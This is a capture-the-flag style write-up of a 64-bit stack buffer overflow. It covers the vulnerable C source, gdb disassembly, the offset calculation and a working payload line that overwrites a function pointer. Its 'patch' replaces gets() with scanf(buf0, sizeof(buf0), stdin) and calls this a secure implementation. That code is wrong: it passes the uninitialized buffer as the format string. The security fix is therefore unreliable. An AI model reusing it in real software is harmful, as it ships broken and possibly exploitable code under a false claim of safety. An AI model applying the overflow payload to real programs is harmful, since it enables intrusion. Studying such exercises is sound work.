This is essentially the b2 problem, however it is 64 bit. This does change some things.

Let's take a look at the source code...
```
#include <stdio.h>
#include <stdlib.h>

int nothing_interesting()
{

	printf("Level Cleared\n");
}

int main()
{
	char buf1[55];
	char buf0[300];
	volatile int (*var1)();
	var1 = 0;

	gets(buf0);

	if (var1)
	{
		printf("Wait, you aren't supposed to be here\n");
		var1();
	}

	else
	{
		printf("O look you didn't solve this. How very predictable\n");
	}
}
```

So we can see that our objective lies in the nothing_interesting() function. However it doesn't call it anywhere in the main function. However it does call a function, which was declared as a volatile int. In addition to that it has a buffer overflow vulnerabillity where it uses gets() to read into buf0. So we should be able to exploit this program by overflowing buf0 to rewrite var1 with the address of the nothing_interesting() function. This way, the if then statement will evaluate as true and when the var1() call runs, it will run the nothing_interesting() function. Also buf1 doesn't serve any purpose as far as I can tell. It's just there to troll with you. So let's solve this with gdb.

First fire up gdb

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/b2_64$ gdb ./b2_64
```

One wall of text later...
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400577 <+0>:	push   rbp
   0x0000000000400578 <+1>:	mov    rbp,rsp
   0x000000000040057b <+4>:	sub    rsp,0x170
   0x0000000000400582 <+11>:	mov    QWORD PTR [rbp-0x8],0x0
   0x000000000040058a <+19>:	lea    rax,[rbp-0x170]
   0x0000000000400591 <+26>:	mov    rdi,rax
   0x0000000000400594 <+29>:	mov    eax,0x0
   0x0000000000400599 <+34>:	call   0x400450 <gets@plt>
   0x000000000040059e <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004005a3 <+44>:	je     0x4005bc <main+69>
   0x00000000004005a5 <+46>:	mov    edi,0x400668
   0x00000000004005aa <+51>:	call   0x400430 <puts@plt>
   0x00000000004005af <+56>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004005b3 <+60>:	mov    eax,0x0
   0x00000000004005b8 <+65>:	call   rdx
   0x00000000004005ba <+67>:	jmp    0x4005c6 <main+79>
   0x00000000004005bc <+69>:	mov    edi,0x400690
   0x00000000004005c1 <+74>:	call   0x400430 <puts@plt>
   0x00000000004005c6 <+79>:	mov    eax,0x0
   0x00000000004005cb <+84>:	leave  
   0x00000000004005cc <+85>:	ret    
End of assembler dump.
```

So right now, we are looking at the assembly code. First thing we should figure out is how much data we will need to input in order to overflow the buffer and write over the var1 volatile int. Let's see if we can find out where in memeory the buffer starts.

```
   0x000000000040058a <+19>:	lea    rax,[rbp-0x170]
   0x0000000000400591 <+26>:	mov    rdi,rax
   0x0000000000400594 <+29>:	mov    eax,0x0
   0x0000000000400599 <+34>:	call   0x400450 <gets@plt>
```

Looking here we can see the assembly call for the gets() function. We know that the gets() function uses buf0 (the buffer we are after) as it's argument. Thing is we see the lea instruction with a stack position. The lea address prepares an area of memory (like a buffer) to be pushed onto the stack and used by a function. Since function paramters are pushed onto the stack right before the function is called, it is probably the buffer we are after which is stored at rbp-0x170.

Next we need to see where the int is stored. We know that it is used in an if then statement, which assembly does that through the use of a cmp function (cmp function just compares two things by subtracting one from another).

```
   0x000000000040059e <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004005a3 <+44>:	je     0x4005bc <main+69>
```

So we can see that a value on the stack is being compared to 0 (which is what ints are compared to in an if then statment like the one were dealing with). So we can be pretty sure that the stack location is rbp-0x8.

So we know the two stack loactions. let's caluclate the differece using python.

```
guyinatuxedo@tux:~$ python
Python 2.7.12 (default, Nov 19 2016, 06:48:10) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x170 - 0x8
360
>>> exit()
```

So as you can see, the difference is 360 bytes. So we should be able to write 361 characters and overflow the variable. Let's try it.

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/b2_64$ python -c 'print "1"*361' | ./b2_64
Wait, you aren't supposed to be here
Segmentation fault (core dumped)
```

So we have determined the buffer. Next thing is we need the address of the nothing_interesting() function. We can get it using objdump.

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/b2_64$ objdump -D b2_64 | grep nothing_interesting
0000000000400566 <nothing_interesting>:
```

So we have the address of the nothing_interesting() function which is 0000000000400566. So let's consrtuct the payload. Our payload will consist of two entities.

Filler = 360 characters

Address = 0x0000000000400566 (in little endian)

So let's try our exploit...

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/b2_64$ python -c 'print "1"*360 + "\x66\x05\x40\x00\x00\x00\x00\x00"' | ./b2_64
Wait, you aren't supposed to be here
Level Cleared
```

And just like that, we pwned the binary.

Now let's patch the program.

```
#include <stdio.h>
#include <stdlib.h>

int nothing_interesting()
{

    printf("Level Cleared\n");
}

int main()
{
//  char buf1[55];
    char buf0[300];
    volatile int (*var1)();
    var1 = 0;

    scanf(buf0, sizeof(buf0), stdin);

    if (var1)
    {
        printf("Wait, you aren't supposed to be here\n");
        var1();
    }

    else
    {
        printf("O look you didn't solve this. How very predictable\n");
    }
}
```

So as you can see we replaced the gets() function with a secure implementation of the scanf() function. In addition to that we commented out the unused buf1 buffer. Now let's see if we actually patched it.

```
guyinatuxedo@tux:/Hackery/cr@ck_th3_c0de/buf_ovf/b2_64$ python -c 'print "1"*360 + "\x66\x05\x40\x00\x00\x00\x00\x00"' | ./b2_64_secure
O look you didn't solve this. How very predictable
```

And just like that, we patched the binary
